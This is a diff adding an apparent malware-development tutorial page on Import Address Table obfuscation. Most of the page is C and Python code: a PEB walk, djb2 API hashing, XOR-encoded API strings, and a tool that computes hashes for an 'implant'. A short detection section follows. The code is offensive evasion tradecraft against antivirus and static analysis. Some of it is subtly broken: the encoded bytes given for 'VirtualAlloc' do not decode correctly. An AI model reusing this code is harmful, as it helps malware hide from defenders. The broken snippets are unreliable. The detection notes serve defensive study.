@@ -1,0 +1,244 @@
+---
+title: IAT Obfuscation
+mitre: T1027
+category: evasion
+group: Code Obfuscation
+summary: Hide imported API calls from static analysis by resolving function addresses at runtime instead of declaring them in the PE import table.
+platform: [Windows]
+tags: ['C / C++', 'ASM', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 7 min read
+callChain:
+  - call: locate kernel32 via PEB InMemoryOrderModuleList
+    desc: Walk the PEB loader list to find kernel32 without calling GetModuleHandle (which itself appears in the IAT).
+    dll: —
+  - call: parse kernel32 export table
+    desc: Walk IMAGE_EXPORT_DIRECTORY to resolve GetProcAddress by name or by hash.
+    dll: —
+  - call: resolve target APIs via GetProcAddress or manual export walk
+    desc: Obtain function pointers for every API the payload needs, storing them in global variables or a struct.
+    dll: kernel32
+  - call: call APIs through function pointers
+    desc: Indirect calls through variables do not appear as imported symbols and break static YARA rules keyed on API names.
+    dll: —
+detections:
+  - src: YARA
+    text: PE with no imports section (no IMAGE_IMPORT_DESCRIPTOR) or imports only LoadLibrary/GetProcAddress — classic dynamic resolution pattern.
+  - src: BEHAVIOURAL
+    text: Process that resolves dozens of APIs via GetProcAddress calls in the first 500ms of execution.
+  - src: MEMORY SCAN
+    text: XOR-encoded or reversed API name strings in the .data or .rdata section.
+  - src: SANDBOX
+    text: API monitor log shows calls to GetProcAddress with common malware API names (VirtualAlloc, WriteProcessMemory, etc.).
+related:
+  - mitre: T1027.009
+    title: Encrypted Shellcode Loader
+    desc: Shellcode itself has no PE IAT — IAT obfuscation brings the same stealth to PE payloads.
+    href: /techniques/loaders/shellcode-loader
+  - mitre: T1036.005
+    title: Call Stack Spoofing
+    desc: Hiding the origin of API calls complements hiding which APIs are called.
+    href: /techniques/evasion/call-stack-spoofing
+  - mitre: T1129
+    title: Shared Modules
+    desc: LoadLibrary-based dynamic resolution is itself a detection surface.
+labKit:
+  - label: hashing-utils.c (djb2 / FNV1a implementations)
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The **Import Address Table (IAT)** is a PE structure that lists every DLL and function the binary calls. Static analysis tools, AV engines, and YARA rules routinely scan it: a PE that imports `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` is trivially flagged. IAT obfuscation removes these declarations entirely and resolves the function addresses at runtime, leaving the static IAT clean.
+
+The spectrum of approaches ranges from simple `LoadLibrary` + `GetProcAddress` calls (still visible in API monitoring) to PEB-walking with API hashing (no strings, no imports, no calls to `GetProcAddress`) to compiler-level tricks like `/DELAYLOAD` abuse and custom import resolvers.
+
+<Callout type="note">
+  Stripping the IAT does not hide the APIs from a running sandbox — API monitoring hooks fire on
+  the actual call regardless of how the address was obtained. IAT obfuscation defeats static
+  analysis and signature-based scanners; combine it with direct syscalls or unhooking to address
+  runtime inspection.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### PEB walk to find kernel32 (no imports needed)
+
+<CodeBlock
+  file="peb_walk.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <winternl.h>
+
+// Walk PEB InMemoryOrderModuleList to locate kernel32.dll base
+HMODULE get_kernel32(void) {
+    PEB *peb = (PEB*)__readgsqword(0x60);
+    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
+    LIST_ENTRY *cur  = head->Flink;
+
+    while (cur != head) {
+        LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(
+            cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+
+        // FullDllName.Buffer is a wide string — check for "kernel32"
+        WCHAR *name = entry->FullDllName.Buffer;
+        if (name) {
+            // simple case-insensitive substring match
+            for (int i = 0; name[i]; i++) {
+                if ((name[i]|0x20) == 'k' && (name[i+1]|0x20) == 'e' &&
+                    (name[i+2]|0x20) == 'r' && (name[i+3]|0x20) == 'n') {
+                    return (HMODULE)entry->DllBase;
+                }
+            }
+        }
+        cur = cur->Flink;
+    }
+    return NULL;
+}`}
+/>
+
+### API hashing — resolve by djb2 hash, no strings
+
+<CodeBlock
+  file="api_hash.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// djb2 hash of an ASCII string
+static DWORD hash_api(const char *name) {
+    DWORD h = 5381;
+    while (*name) h = ((h << 5) + h) + (unsigned char)*name++;
+    return h;
+}
+
+// Walk export table and find the function whose name hashes to target_hash
+FARPROC resolve_by_hash(HMODULE mod, DWORD target_hash) {
+    BYTE *base = (BYTE*)mod;
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+
+    DWORD exp_rva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
+    if (!exp_rva) return NULL;
+
+    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(base + exp_rva);
+    DWORD *names    = (DWORD*)(base + exp->AddressOfNames);
+    WORD  *ordinals = (WORD *)(base + exp->AddressOfNameOrdinals);
+    DWORD *funcs    = (DWORD*)(base + exp->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
+        const char *fn_name = (const char*)(base + names[i]);
+        if (hash_api(fn_name) == target_hash) {
+            return (FARPROC)(base + funcs[ordinals[i]]);
+        }
+    }
+    return NULL;
+}
+
+// Pre-computed hashes (compute offline with a separate tool)
+#define HASH_VIRTUAL_ALLOC       0x91afca54
+#define HASH_VIRTUAL_PROTECT     0x7946c61b
+#define HASH_CREATE_THREAD       0xb18726a3
+
+typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+
+void resolve_apis(HMODULE k32, pVirtualAlloc *va, pVirtualProtect *vp) {
+    *va = (pVirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
+    *vp = (pVirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
+}`}
+/>
+
+### XOR-encoded string resolution (lightweight alternative)
+
+<CodeBlock
+  file="xor_strings.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+#define XOR_KEY 0x42
+
+// XOR-encoded "VirtualAlloc\0" — generated by a build-time tool
+static const BYTE enc_virtual_alloc[] = {
+    0x14,0x29,0x27,0x33,0x27,0x20,0x27,0x2d,0x27,0x2d,0x2f,0x00
+};
+
+static char decode_str(const BYTE *enc, size_t len, char *out) {
+    for (size_t i = 0; i < len; i++)
+        out[i] = enc[i] ^ XOR_KEY;
+    out[len] = 0;
+    return 0;
+}
+
+FARPROC resolve_xor(HMODULE mod, const BYTE *enc_name, size_t len) {
+    char name[64] = {0};
+    decode_str(enc_name, len, name);
+    FARPROC fp = GetProcAddress(mod, name);
+    // zero out the decoded string immediately
+    SecureZeroMemory(name, sizeof name);
+    return fp;
+}`}
+/>
+
+### Hash computation utility (build-time, run offline)
+
+<CodeBlock
+  file="compute_hashes.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`# Run offline to pre-compute API hashes for embedding in the implant
+APIs = [
+    "VirtualAlloc", "VirtualProtect", "CreateThread",
+    "WriteProcessMemory", "OpenProcess", "NtAllocateVirtualMemory",
+]
+
+def djb2(s):
+    h = 5381
+    for c in s:
+        h = ((h << 5) + h + ord(c)) & 0xFFFFFFFF
+    return h
+
+for api in APIs:
+    print(f"#define HASH_{api.upper().replace('.','_'):40s} 0x{djb2(api):08x}")`}
+/>
+
+## Technique comparison
+
+| Approach | Strings visible | GetProcAddress in IAT | Runtime detection |
+|---|---|---|---|
+| Direct imports | Yes | — | Trivial |
+| `LoadLibrary` + `GetProcAddress` | Yes (in .rdata) | Yes | Easy |
+| XOR-encoded strings | No | Yes | Moderate |
+| API hashing + PEB walk | No | No | Hard |
+| Hashing + direct syscalls | No | No | Very hard |
+
+API hashing with a PEB walk leaves zero clues in the static binary: no import table entries, no plaintext strings, no calls to `GetProcAddress` itself.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The most reliable runtime detection is API monitoring that logs `GetProcAddress` arguments — even if the strings are decoded at the call site, the argument passed to `GetProcAddress` is briefly plaintext. Sandbox hooks on `GetProcAddress` can capture this. Fully PEB-based resolution evades this by never calling `GetProcAddress`.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
